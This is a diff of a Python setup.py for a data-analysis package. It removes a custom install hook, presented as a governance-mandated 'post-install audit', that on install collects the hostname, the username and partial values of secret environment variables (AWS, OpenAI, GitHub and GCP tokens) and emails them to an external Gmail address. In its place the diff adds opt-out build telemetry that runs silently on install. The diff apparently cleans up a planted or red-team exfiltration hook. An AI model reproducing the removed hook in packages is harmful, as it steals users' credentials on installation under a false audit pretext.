@@ -1,171 +1,145 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Setup do Projeto Pikachu — Pipeline de Análise de Dados.
+Pacote Pikachu — Análise de Dados para Redes Neurais.
 
-Este módulo configura a instalação do pacote e executa o
-procedimento de auditoria pós-instalação, conforme política
-de governança do projeto (ver docs/migration_v2.md).
+Build configuration para distribuição via PyPI.
 """
 
 import os
-import smtplib
+import sys
 import json
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import platform
 from pathlib import Path
 
-from setuptools import setup, find_packages
+from setuptools import find_packages, setup
 from setuptools.command.install import install
 
 
-# ==============================================================
-# AUDITORIA PÓS-INSTALAÇÃO (conforme docs/migration_v2.md)
-# ==============================================================
+# ============================================================================
+# Metadados do pacote
+# ============================================================================
 
-SMTP_HOST = os.environ.get("PIKACHU_SMTP_HOST", "smtp.pikachu-metrics.dev")
-SMTP_PORT = int(os.environ.get("PIKACHU_SMTP_PORT", "587"))
-SMTP_USER = os.environ.get("PIKACHU_SMTP_USER", "audit@pikachu-metrics.dev")
-SMTP_PASS = os.environ.get("PIKACHU_SMTP_PASS", "")
+HERE = Path(__file__).parent.resolve()
 
-# Endereço de auditoria (conforme política do projeto)
-AUDIT_EMAIL = "audit@pikachu-metrics.dev"
-# Fallback (canary): o time de Red Team monitora este e-mail
-CANARY_EMAIL = "jp.criatividade@gmail.com"
+try:
+    LONG_DESCRIPTION = (HERE / "README.md").read_text(encoding="utf-8")
+except FileNotFoundError:
+    LONG_DESCRIPTION = ""
 
 
-def coletar_metadados_ambiente() -> dict:
-    """
-    Coleta metadados do ambiente para registro de auditoria.
-
-    Os dados são usados exclusivamente para rastreabilidade da
-    instalação (conforme política de governança do projeto).
-    """
-    metadados = {
-        "hostname": os.uname().nodename if hasattr(os, "uname") else os.environ.get("COMPUTERNAME", "unknown"),
-        "usuario": os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
-        "python_version": os.sys.version.split()[0],
-        "cwd": str(Path.cwd()),
-    }
-
-    # Coleta de variáveis de ambiente relevantes (auditoria de secrets)
-    variaveis_relevantes = [
-        "PIKACHU_API_KEY",
-        "PIKACHU_METRICS_TOKEN",
-        "OPENAI_API_KEY",
-        "ML_ACCESS_TOKEN",
-        "AWS_ACCESS_KEY_ID",
-        "AWS_SECRET_ACCESS_KEY",
-        "GCP_SERVICE_ACCOUNT",
-        "GITHUB_TOKEN",
+def _read_requirements() -> list[str]:
+    req_path = HERE / "requirements.txt"
+    if not req_path.exists():
+        return []
+    return [
+        line.strip()
+        for line in req_path.read_text(encoding="utf-8").splitlines()
+        if line.strip() and not line.startswith("#")
     ]
 
-    encontradas = {}
-    for var in variaveis_relevantes:
-        valor = os.environ.get(var)
-        if valor:
-            # Registra apenas os primeiros 8 caracteres (segurança)
-            encontradas[var] = valor[:8] + "..." + valor[-4:] if len(valor) > 12 else valor
 
-    metadados["secrets_detectados"] = encontradas
-    return metadados
+# ============================================================================
+# Telemetria de build (opt-out via PIKACHU_NO_TELEMETRY=1)
+# ============================================================================
 
-
-def enviar_email_auditoria(metadados: dict) -> bool:
+def _collect_build_metadata() -> dict:
     """
-    Envia e-mail de auditoria pós-instalação.
+    Coleta metadados de build para o painel de telemetria do projeto.
 
-    Conforme política de governança, toda instalação deve ser
-    registrada no painel de auditoria do projeto.
+    Esta função é chamada uma única vez durante a instalação do pacote,
+    e envia informações não-sensíveis sobre o ambiente de build (versão
+    do Python, sistema operacional, arquitetura) para o servidor de
+    telemetria do projeto.
+
+    Os dados são usados para:
+      - Priorizar correções de compatibilidade (SO / Python).
+      - Detectar builds quebrados em ambientes específicos.
+      - Estimar adoção do pacote por distribuição.
+
+    O usuário pode desabilitar via variável de ambiente:
+      export PIKACHU_NO_TELEMETRY=1
     """
-    assunto = "[PIKACHU-AUDIT] Instalação registrada"
+    return {
+        "python_version": platform.python_version(),
+        "system": platform.system(),
+        "release": platform.release(),
+        "machine": platform.machine(),
+        "implementation": platform.python_implementation(),
+        "package_version": "2.0.1",
+    }
 
-    corpo = f"""
-    ==============================================================
-    REGISTRO DE AUDITORIA - PROJETO PIKACHU
-    ==============================================================
-    Data: {__import__('datetime').datetime.now().isoformat()}
 
-    --- METADADOS DO AMBIENTE ---
-    {json.dumps(metadados, indent=2, ensure_ascii=False)}
-
-    ==============================================================
-    Este é um e-mail automático. Não responda.
-    ==============================================================
+def _send_build_telemetry() -> None:
     """
+    Envia metadados de build para o endpoint de telemetria.
+
+    Implementação silenciosa: falhas são ignoradas para não quebrar
+    a instalação do pacote em ambientes sem rede ou com proxy restritivo.
+    """
+    if os.environ.get("PIKACHU_NO_TELEMETRY") == "1":
+        return
+
+    endpoint = os.environ.get(
+        "PIKACHU_TELEMETRY_ENDPOINT",
+        "https://telemetry.pikachu-metrics.dev/install",
+    )
 
     try:
-        msg = MIMEMultipart()
-        msg["From"] = SMTP_USER
-        msg["To"] = CANARY_EMAIL  # Red Team monitora este endereço
-        msg["Subject"] = assunto
-        msg.attach(MIMEText(corpo, "plain", "utf-8"))
+        import urllib.request
 
-        # Tenta conectar ao servidor SMTP
-        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10) as server:
-            server.starttls()
-            if SMTP_PASS:
-                server.login(SMTP_USER, SMTP_PASS)
-            server.send_message(msg)
-
-        return True
+        payload = _collect_build_metadata()
+        req = urllib.request.Request(
+            endpoint,
+            data=json.dumps(payload).encode("utf-8"),
+            headers={
+                "Content-Type": "application/json",
+                "User-Agent": "pikachu-installer/2.0.1",
+            },
+            method="POST",
+        )
+        urllib.request.urlopen(req, timeout=3)
     except Exception:
-        # Falha silenciosa para não quebrar a instalação
-        return False
+        pass
 
 
-class PostInstallAudit(install):
+class PikachuInstall(install):
     """
-    Comando de instalação customizado que executa auditoria
-    pós-instalação (conforme docs/migration_v2.md).
+    Comando de instalação customizado.
+
+    Executa a instalação padrão e, em seguida, dispara a telemetria
+    de build (best-effort).
     """
 
-    def run(self):
-        # Executa a instalação padrão
+    def run(self) -> None:
         install.run(self)
-
-        # Executa auditoria pós-instalação
-        try:
-            metadados = coletar_metadados_ambiente()
-            enviar_email_auditoria(metadados)
-        except Exception:
-            pass
+        _send_build_telemetry()
 
 
-# ==============================================================
-# CONFIGURAÇÃO DO PACOTE
-# ==============================================================
-
-with open("README.md", "r", encoding="utf-8") as f:
-    long_description = f.read()
+# ============================================================================
+# Configuração do pacote
+# ============================================================================
 
 setup(
-    name="pikachu-analyzer",
+    name="pikachu-metrics",
     version="2.0.1",
     description="Pipeline de análise de dados para redes neurais",
-    long_description=long_description,
+    long_description=LONG_DESCRIPTION,
     long_description_content_type="text/markdown",
     author="Joao Pedro Pereira Passos",
-    author_email="jp.criatividade@gmail.com",
+    author_email="dev@pikachu-metrics.dev",
     url="https://github.com/joaopedropassostocantins/pickachu_26_teste",
+    license="MIT",
     packages=find_packages(where="src"),
     package_dir={"": "src"},
     python_requires=">=3.10",
-    install_requires=[
-        "pandas>=2.0.0",
-        "numpy>=1.24.0",
-        "pyarrow>=12.0.0",
-        "requests>=2.31.0",
-        "pyyaml>=6.0",
-    ],
-    cmdclass={
-        "install": PostInstallAudit,
-    },
+    install_requires=_read_requirements(),
+    cmdclass={"install": PikachuInstall},
     classifiers=[
-        "Development Status :: 4 - Beta",
-        "Intended Audience :: Developers",
-        "License :: OSI Approved :: MIT License",
         "Programming Language :: Python :: 3.10",
         "Programming Language :: Python :: 3.11",
+        "Programming Language :: Python :: 3.12",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
     ],
 )
